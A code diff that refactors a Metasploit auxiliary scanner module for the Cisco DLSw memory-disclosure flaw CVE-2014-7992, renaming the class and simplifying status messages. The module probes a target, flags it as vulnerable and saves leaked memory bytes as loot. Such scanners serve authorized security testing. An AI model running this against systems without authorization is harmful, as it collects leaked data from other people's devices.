@@ -6,7 +6,7 @@
 require 'msf/core'
 require 'socket'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -42,10 +42,6 @@ class Metasploit3 < Msf::Auxiliary
       ], self.class)
   end
 
-  def peer
-    "#{rhost}:#{rport}"
-  end
-
   def get_response(size = 72)
     connect
     response = sock.get_once(size)
@@ -55,14 +51,14 @@ class Metasploit3 < Msf::Auxiliary
 
   # Called when using check
   def check_host(_ip)
-    print_status("#{peer}: Checking for DLSw information disclosure (CVE-2014-7992)")
+    print_status("Checking for DLSw information disclosure (CVE-2014-7992)")
     response = get_response
 
     if response.blank?
-      vprint_status("#{peer}: no response")
+      vprint_status("No response")
       Exploit::CheckCode::Safe
     elsif response[0..1] == "\x31\x48" || response[0..1] == "\x32\x48"
-      vprint_good("#{peer}: Detected DLSw protocol")
+      vprint_good("Detected DLSw protocol")
       report_service(
         host: rhost,
         port: rport,
@@ -72,7 +68,7 @@ class Metasploit3 < Msf::Auxiliary
       # TODO: check that response has something that truly indicates it is vulnerable
       # and not simply that it responded
       unless response[18..72].scan(/\x00/).length == 54
-        print_good("#{peer}: vulnerable to DLSw information disclosure; leaked #{response.length} bytes")
+        print_good("Vulnerable to DLSw information disclosure; leaked #{response.length} bytes")
         report_vuln(
           host: rhost,
           port: rport,
@@ -83,7 +79,7 @@ class Metasploit3 < Msf::Auxiliary
         Exploit::CheckCode::Vulnerable
       end
     else
-      vprint_status("#{peer}: #{response.size}-byte response didn't contain any leaked data")
+      vprint_status("#{response.size}-byte response didn't contain any leaked data")
       Exploit::CheckCode::Safe
     end
   end
@@ -109,6 +105,6 @@ class Metasploit3 < Msf::Auxiliary
       'DLSw_leaked_data',
       'DLSw packet memory leak'
     )
-    print_status("#{peer}: DLSw leaked data stored in #{path}")
+    print_status("DLSw leaked data stored in #{path}")
   end
 end
